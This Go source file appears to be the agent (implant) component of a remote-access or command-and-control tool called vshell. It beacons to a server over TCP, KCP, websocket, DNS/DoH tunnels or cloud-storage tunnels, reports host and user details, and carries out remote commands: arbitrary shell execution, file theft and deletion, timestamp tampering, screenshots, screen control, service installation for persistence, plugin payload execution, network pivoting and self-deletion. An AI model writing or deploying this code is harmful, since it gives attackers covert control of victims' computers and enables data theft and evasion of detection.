package agent

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"vshell/internal/model"
	"vshell/internal/protocol"

	"github.com/gorilla/websocket"
	kcp "github.com/xtaci/kcp-go/v5"
)

type Config struct{ ServerAddr, Vkey, VerifyKey, Transport, DNSDomain, PublicDNS, OSSURL, OSSKey, ProxyURL string }
type Agent struct {
	cfg        Config
	terminalMu sync.Mutex
	terminals  map[string]*terminalSession
}

func New(cfg Config) *Agent {
	if cfg.VerifyKey == "" {
		cfg.VerifyKey = randomKey()
	}
	if cfg.Transport == "" {
		cfg.Transport = "tcp"
	}
	return &Agent{cfg: cfg, terminals: make(map[string]*terminalSession)}
}

func (a *Agent) Run(ctx context.Context) error {
	backoff := time.Second
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		err := a.runOnce(ctx)
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if err == nil {
			backoff = time.Second
		}
		timer := time.NewTimer(backoff)
		select {
		case <-ctx.Done():
			timer.Stop()
			return ctx.Err()
		case <-timer.C:
		}
		if backoff < 30*time.Second {
			backoff *= 2
		}
	}
}

func (a *Agent) runOnce(ctx context.Context) error {
	raw, err := a.dial()
	if err != nil {
		return err
	}
	defer raw.Close()
	closed := make(chan struct{})
	defer close(closed)
	go func() {
		select {
		case <-ctx.Done():
			_ = raw.Close()
		case <-closed:
		}
	}()
	pc := protocol.NewConn(raw)
	hello := model.Hello{VerifyKey: a.cfg.VerifyKey, Vkey: a.cfg.Vkey, LocalIP: localIP(), UserName: userName(), HostName: hostName(), OSName: runtime.GOOS + "_" + runtime.GOARCH, ProcessName: processName()}
	if err := pc.WriteMessage(protocol.Message{Type: "hello", Data: protocol.MarshalData(hello)}); err != nil {
		return err
	}
	ack, err := pc.ReadMessage()
	if err != nil || !ack.OK {
		return errors.New("listener rejected client")
	}
	for {
		m, err := pc.ReadMessage()
		if err != nil {
			return err
		}
		if m.Type != "request" {
			continue
		}
		go a.handleRequest(pc, m)
	}
}

func (a *Agent) dial() (net.Conn, error) {
	if strings.EqualFold(a.cfg.Transport, "oss") {
		ossURL := a.cfg.OSSURL
		if ossURL == "" {
			ossURL = a.cfg.ServerAddr
		}
		return protocol.DialOSSTunnel(ossURL, a.cfg.OSSKey)
	}
	if strings.EqualFold(a.cfg.Transport, "dns") || strings.EqualFold(a.cfg.Transport, "doh") || strings.EqualFold(a.cfg.Transport, "dot") {
		resolver := a.cfg.PublicDNS
		if resolver == "" {
			resolver = a.cfg.ServerAddr
		}
		return protocol.DialDNSTunnel(a.cfg.Transport, resolver, a.cfg.DNSDomain)
	}
	if strings.EqualFold(a.cfg.Transport, "ws") {
		url := a.cfg.ServerAddr
		if !strings.HasPrefix(url, "ws://") && !strings.HasPrefix(url, "wss://") {
			url = "ws://" + url
		}
		dialer := *websocket.DefaultDialer
		if a.cfg.ProxyURL != "" {
			dialer.NetDialContext = func(_ context.Context, _, addr string) (net.Conn, error) {
				return dialProxyTCP(a.cfg.ProxyURL, addr)
			}
		}
		ws, _, err := dialer.Dial(url, nil)
		if err != nil {
			return nil, err
		}
		return protocol.NewWebSocketConn(ws), nil
	}
	addr := strings.TrimPrefix(strings.TrimPrefix(a.cfg.ServerAddr, "tcp://"), "TCP://")
	if strings.EqualFold(a.cfg.Transport, "kcp") {
		session, err := kcp.DialWithOptions(addr, nil, 10, 3)
		if err != nil {
			return nil, err
		}
		session.SetStreamMode(true)
		session.SetWriteDelay(true)
		session.SetNoDelay(1, 10, 2, 1)
		session.SetWindowSize(1024, 1024)
		_ = session.SetMtu(1350)
		session.SetACKNoDelay(true)
		return session, nil
	}
	return dialProxyTCP(a.cfg.ProxyURL, addr)
}

func (a *Agent) handleRequest(pc *protocol.Conn, m protocol.Message) {
	data, err := a.execute(m.Action, m.Data)
	resp := protocol.Message{Type: "response", RequestID: m.RequestID, OK: err == nil, Data: data}
	if err != nil {
		resp.Error = err.Error()
	}
	_ = pc.WriteMessage(resp)
}

func (a *Agent) execute(action string, raw json.RawMessage) (json.RawMessage, error) {
	var p map[string]any
	_ = json.Unmarshal(raw, &p)
	switch action {
	case "ping":
		return protocol.MarshalData(map[string]any{"time": time.Now().Unix()}), nil
	case "shell":
		out, err := runShell(str(p, "command"))
		return protocol.MarshalData(string(out)), err
	case "file_getdisk":
		return protocol.MarshalData(fileDisks()), nil
	case "file_ls":
		items, err := fileList(str(p, "path"))
		return protocol.MarshalData(items), err
	case "file_cat":
		b, err := os.ReadFile(joinTarget(p))
		return protocol.MarshalData(map[string]any{"content": string(b)}), err
	case "file_touch":
		f, err := os.OpenFile(joinTarget(p), os.O_CREATE|os.O_WRONLY, 0o666)
		if f != nil {
			_ = f.Close()
		}
		return protocol.MarshalData("success"), err
	case "file_mkdir":
		return protocol.MarshalData("success"), os.MkdirAll(joinTarget(p), 0o755)
	case "file_edit":
		return protocol.MarshalData("success"), os.WriteFile(joinTarget(p), []byte(str(p, "content")), 0o666)
	case "file_mv":
		return protocol.MarshalData("success"), os.Rename(joinTarget(p), filepath.Join(str(p, "path"), str(p, "to")))
	case "file_rm":
		return protocol.MarshalData("success"), os.RemoveAll(joinTarget(p))
	case "file_rmlist":
		for _, name := range strSlice(p["name"]) {
			if err := os.RemoveAll(filepath.Join(str(p, "path"), name)); err != nil {
				return nil, err
			}
		}
		return protocol.MarshalData("success"), nil
	case "file_modifytime":
		t, err := time.ParseInLocation("2006-01-02 15:04:05", str(p, "time"), time.Local)
		if err != nil {
			return nil, err
		}
		return protocol.MarshalData("success"), os.Chtimes(joinTarget(p), t, t)
	case "file_wget":
		return protocol.MarshalData("success"), downloadFile(str(p, "target"), str(p, "path"))
	case "file_read":
		b, err := os.ReadFile(joinTarget(p))
		return protocol.MarshalData(map[string]any{"content": base64.StdEncoding.EncodeToString(b), "size": len(b)}), err
	case "file_write":
		b, err := base64.StdEncoding.DecodeString(str(p, "content"))
		if err != nil {
			return nil, err
		}
		return protocol.MarshalData("success"), os.WriteFile(joinTarget(p), b, 0o666)
	case "file_upload_oss":
		go func(parameters map[string]any) {
			_ = uploadFileToOSS(parameters)
		}(p)
		return protocol.MarshalData("success"), nil
	case "screenshot":
		b, err := captureScreenshot(str(p, "quality"))
		if err != nil {
			return nil, err
		}
		return protocol.MarshalData(base64.StdEncoding.EncodeToString(b)), nil
	case "screen_control":
		return protocol.MarshalData("success"), screenControl(p)
	case "service_install":
		out, err := serviceInstall(str(p, "name"), str(p, "description"))
		return protocol.MarshalData(string(out)), err
	case "service_remove":
		out, err := serviceRemove(str(p, "name"))
		return protocol.MarshalData(string(out)), err
	case "run_plugin":
		out, err := runPlugin(p)
		return protocol.MarshalData(string(out)), err
	case "terminal_open":
		id, out, err := a.openTerminal()
		return protocol.MarshalData(map[string]any{"id": id, "content": out}), err
	case "terminal_write":
		out, err := a.writeTerminal(str(p, "terminal_id"), str(p, "content"))
		return protocol.MarshalData(out), err
	case "terminal_read":
		out, err := a.readTerminal(str(p, "terminal_id"))
		return protocol.MarshalData(out), err
	case "terminal_close":
		return protocol.MarshalData("success"), a.closeTerminal(str(p, "terminal_id"))
	case "open_stream":
		go a.openStream(str(p, "stream_id"), str(p, "target"))
		return protocol.MarshalData("opening"), nil
	case "udp_exchange":
		payload, err := base64.StdEncoding.DecodeString(str(p, "content"))
		if err != nil {
			return nil, err
		}
		conn, err := net.DialTimeout("udp", str(p, "target"), 10*time.Second)
		if err != nil {
			return nil, err
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
		if _, err = conn.Write(payload); err != nil {
			return nil, err
		}
		response := make([]byte, 65535)
		n, err := conn.Read(response)
		if err != nil {
			return nil, err
		}
		return protocol.MarshalData(base64.StdEncoding.EncodeToString(response[:n])), nil
	case "delete_file":
		return protocol.MarshalData("success"), deleteRunningExecutable()
	case "exit", "disconnect":
		go func() {
			time.Sleep(250 * time.Millisecond)
			os.Exit(0)
		}()
		return protocol.MarshalData("closing"), nil
	default:
		return nil, fmt.Errorf("unknown action %q", action)
	}
}

func (a *Agent) openStream(streamID, target string) {
	server, err := a.dial()
	if err != nil {
		return
	}
	pc := protocol.NewConn(server)
	if pc.WriteMessage(protocol.Message{Type: "stream", StreamID: streamID}) != nil {
		_ = server.Close()
		return
	}
	dst, err := net.DialTimeout("tcp", target, 15*time.Second)
	if err != nil {
		_ = server.Close()
		return
	}
	defer server.Close()
	defer dst.Close()
	go func() { _, _ = io.Copy(dst, server); _ = dst.Close() }()
	_, _ = io.Copy(server, dst)
}

func runShell(command string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return exec.Command("cmd.exe", "/d", "/s", "/c", command).CombinedOutput()
	}
	return exec.Command("/bin/sh", "-c", command).CombinedOutput()
}
func str(p map[string]any, key string) string {
	if v, ok := p[key].(string); ok {
		return v
	}
	return fmt.Sprint(p[key])
}
func joinTarget(p map[string]any) string { return filepath.Join(str(p, "path"), str(p, "target")) }
func strSlice(v any) []string {
	switch x := v.(type) {
	case []any:
		o := make([]string, 0, len(x))
		for _, v := range x {
			o = append(o, fmt.Sprint(v))
		}
		return o
	case []string:
		return x
	case string:
		return strings.Split(x, ",")
	}
	return nil
}
func randomKey() string { b := make([]byte, 12); _, _ = rand.Read(b); return hex.EncodeToString(b) }
func hostName() string  { v, _ := os.Hostname(); return v }
func processName() string {
	name := os.Args[0]
	if runtime.GOOS != "windows" && strings.HasPrefix(name, "[") {
		return name
	}
	return filepath.Base(name)
}
func userName() string {
	u, e := user.Current()
	if e != nil {
		return ""
	}
	return u.Username
}
func localIP() string {
	c, e := net.Dial("udp", "198.18.0.1:53")
	if e == nil {
		defer c.Close()
		if a, ok := c.LocalAddr().(*net.UDPAddr); ok {
			return a.IP.String()
		}
	}
	return "127.0.0.1"
}

func fileDisks() []model.FileItem {
	if runtime.GOOS != "windows" {
		return []model.FileItem{{Name: "/", IsDir: true, Time: "0", Mode: "0"}}
	}
	out := []model.FileItem{}
	for c := 'A'; c <= 'Z'; c++ {
		root := string(c) + ":/"
		if _, e := os.Stat(root); e == nil {
			out = append(out, model.FileItem{Name: root, IsDir: true, Time: "0", Mode: "0"})
		}
	}
	return out
}
func fileList(path string) ([]model.FileItem, error) {
	entries, err := os.ReadDir(path)
	if err != nil {
		return nil, err
	}
	items := make([]model.FileItem, 0, len(entries))
	for _, e := range entries {
		info, er := e.Info()
		if er != nil {
			continue
		}
		mode := "0666"
		if runtime.GOOS != "windows" {
			mode = fmt.Sprintf("%04o", info.Mode().Perm())
		} else if e.IsDir() {
			mode = "0777"
		}
		items = append(items, model.FileItem{Name: e.Name(), IsDir: e.IsDir(), Time: info.ModTime().Format("2006-01-02 15:04:05"), Mode: mode, Size: func() int64 {
			if e.IsDir() {
				return 0
			}
			return info.Size()
		}()})
	}
	return items, nil
}
func downloadFile(url, dir string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("http status %s", resp.Status)
	}
	name := filepath.Base(resp.Request.URL.Path)
	if name == "." || name == "/" || name == "" {
		name = "download.bin"
	}
	f, err := os.Create(filepath.Join(dir, name))
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}

func captureScreenshot(qualityName string) ([]byte, error) {
	if runtime.GOOS != "windows" {
		return nil, errors.New("screenshot is currently implemented for windows")
	}
	quality := 60
	switch qualityName {
	case "big":
		quality = 100
	case "small":
		quality = 20
	}
	script := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $i=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($i); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $m=New-Object System.IO.MemoryStream; $e=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object {$_.MimeType -eq 'image/jpeg'}; $p=New-Object System.Drawing.Imaging.EncoderParameters 1; $p.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]%d); $i.Save($m,$e,$p); [Convert]::ToBase64String($m.ToArray())`, quality)
	out, err := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script).Output()
	if err != nil {
		return nil, err
	}
	return base64.StdEncoding.DecodeString(strings.TrimSpace(string(out)))
}

func runPlugin(p map[string]any) ([]byte, error) {
	b, err := base64.StdEncoding.DecodeString(str(p, "content"))
	if err != nil {
		return nil, err
	}
	name := filepath.Base(str(p, "name"))
	args := strSlice(p["args"])
	if len(args) == 0 && str(p, "procArg") != "" {
		args = splitCommandLine(str(p, "procArg"))
	}
	return runPluginPlatform(name, b, args)
}

func splitCommandLine(line string) []string {
	var args []string
	var current strings.Builder
	var quote rune
	escaped := false
	flush := func() {
		if current.Len() != 0 {
			args = append(args, current.String())
			current.Reset()
		}
	}
	for _, r := range line {
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && quote != 0 {
			escaped = true
			continue
		}
		if r == '\'' || r == '"' {
			if quote == 0 {
				quote = r
				continue
			}
			if quote == r {
				quote = 0
				continue
			}
		}
		if (r == ' ' || r == '\t') && quote == 0 {
			flush()
			continue
		}
		current.WriteRune(r)
	}
	flush()
	return args
}

var _ = bytes.MinRead
var _ = strconv.IntSize
